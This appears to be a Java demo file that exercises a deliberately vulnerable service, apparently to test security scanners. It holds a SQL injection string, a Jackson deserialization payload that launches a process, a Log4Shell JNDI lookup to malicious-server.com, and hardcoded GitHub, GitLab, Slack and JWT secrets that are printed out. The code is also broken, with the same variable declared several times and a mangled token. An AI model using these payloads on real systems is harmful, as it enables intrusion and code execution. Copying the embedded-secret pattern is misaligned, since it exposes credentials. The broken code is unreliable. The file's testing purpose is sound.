package org.example;

public class DemoApplication {
    public static void main(String[] args) {
        VulnerableService service = new VulnerableService();
        // SQL Injection
        service.vulnerableSqlQuery("admin' OR '1'='1");









        String githubToken = "ghp_D8fR2s$#%@%#@%@#Y9ABQpGgW2S3xF4dVYZkNpWqz57TbR";


        String githubToken = "ghp_D8fR2sY9ABQpGgW2S3xF4dVYZkNpWqz57TbR";

        String githubToken = "ghp_D8fR2sY9ABQpGgW2S3xF4dVYZkNpWqz57TbR";
        String githubToken44 = "ghp_D8fR2sY9ABQpGgW2S3xF4dVYZkNpWqz57TbR";
        // 🔐 GitLab Token
        String gitlabToken = "glpat-28eFqsNLmXKJxuPbaYBZ";
        String gitlabToken2 = "glpat-28eFqsNLmXKJxuPbaYBZ";
        // 🔐 Slack Bot Token
        String slackBotToken = "xoxb-875392083274-987654321098-zD47HhU0LvIUGY6oDsP7hVJf";
        // 🔐 Twilio Auth Token







        String jwtSecret = "45353$@3@#5cLKMnf8!JHbdE6vZ4UPpTfL";
        // Print the hardcoded secret
        service.printApiKey();
        // Jackson insecure deserialization demo payload (crafted malicious JSON)
        String maliciousJson = "{\"@class\":\"java.lang.AutoCloseable\",\"@type\":\"java.lang.ProcessBuilder\",\"command\":[\"calc\"]}";
        service.jacksonDeserialize(maliciousJson);
        // Log4j JNDI injection (Log4Shell) example input

        String maliciousLogInput = "${jndi:ldap://malicious-server.com/a}";
        service.log4jJndiInjection(maliciousLogInput);
    }
}
